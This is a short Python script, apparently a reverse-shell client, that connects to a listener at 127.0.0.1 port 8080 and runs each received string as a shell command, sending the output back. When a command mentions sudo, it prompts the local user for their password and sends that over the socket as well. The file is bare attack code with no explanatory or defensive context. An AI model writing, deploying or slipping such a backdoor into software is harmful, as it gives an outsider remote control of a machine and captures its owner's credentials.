import socket,subprocess,getpass

host = "127.0.0.1"
port = 8080
buff = 2048	
client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)

client_socket.connect((host,port))

while True:
	received_data = client_socket.recv(buff)
	if received_data == 'quit' :
		client_socket.close()
	elif "sudo" in received_data :
		password = getpass.getpass()
		client_socket.send(str(password))
		
	else :
		command = subprocess.check_output(received_data, shell=True)
		if not command:
			client_socket.send("Command succesfully executed.")
		else:
			client_socket.send(str(command) + "\nCommand succesfully executed.")
		
